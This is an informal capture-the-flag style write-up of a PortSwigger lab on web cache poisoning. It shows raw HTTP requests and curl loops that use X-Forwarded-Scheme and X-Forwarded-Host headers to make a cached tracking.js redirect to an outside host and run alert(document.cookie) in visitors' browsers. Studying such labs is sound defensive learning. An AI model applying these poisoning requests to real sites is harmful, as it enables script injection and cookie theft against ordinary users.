
# Description

This lab contains a web cache poisoning vulnerability that is only exploitable when you use multiple headers to craft a malicious request. A user visits the home page roughly once a minute. To solve this lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

# Solution

Found **x-forwarded-scheme** using ParamMiner(Header Poisoning)

Malicious request
```
GET / HTTP/2
Host: 0a92000b04c04aca80eb85070047007b.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
X-Forwarded-Scheme: http

```

Response 
```
HTTP/2 302 Found
Location: https://0a92000b04c04aca80eb85070047007b.web-security-academy.net/?fcbz=1
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 9
X-Cache: hit
Content-Length: 0

```

Request
```
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a99009004f44a6d80f384fc017f002b.exploit-server.net
```

Response
```
HTTP/2 302 Found
Location: https://exploit-0a99009004f44a6d80f384fc017f002b.exploit-server.net/?fcbz=1
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 0
```


Request
```
X-Forwarded-Scheme: http
X-Forwarded-Host: webhook.site/85b98a37-4d99-4433-9d07-025e2d5a9e7a
```

Now if we navigate to `/` using browser, web cache is poisened

And we seek webhook

> [!warning]
> Bruhhhh, i tried to poison `/`, but it just redirects me to my webhook. I need instead poison some js files 

For example `/resources/js/tracking.js`

```bash
while (1); do curl --path-as-is -i -s -k -X $'GET' \                            
-H $'Host: 0a92000b04c04aca80eb85070047007b.web-security-academy.net' \
-H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0' \
-H $'Accept: */*' \
-H $'Accept-Language: en-US,en;q=0.5' \
-H $'Accept-Encoding: gzip, deflate, br' \
-H $'Sec-Fetch-Dest: empty' \
-H $'Sec-Fetch-Mode: cors' \
-H $'Sec-Fetch-Site: same-origin' \
-H $'Priority: u=4' \
-H $'Te: trailers' \
-H $'X-Forwarded-Scheme: nothttps' \
-H $'X-Forwarded-Host: webhook.site/85b98a37-4d99-4433-9d07-025e2d5a9e7a' \
    -b $'session=8AYU0LvOb9zr7q4RQ0UbMX4BYKOqYpMq' \
    $'https://0a92000b04c04aca80eb85070047007b.web-security-academy.net/resources/js/tracking.js'; \
done

```

> [!error]
> Ohhhh, bro. Im cooked. Stop using webhook in portswigger lab. Checker will not accept your payload as solution.

## Final payload

```bash
while (true); do curl --path-as-is -i -s -k -X $'GET' \    
-H $'Host: 0a6c00de031bb5bf812b7b41005700cd.web-security-academy.net' 
-H $'X-Forwarded-Scheme: nothttps' 
-H $'X-Forwarded-Host: exploit-0a7c00ed034ab5bb81bc7a04019f00a0.exploit-server.net' \
$'https://0a6c00de031bb5bf812b7b41005700cd.web-security-academy.net/resources/js/tracking.js'; \
done
```

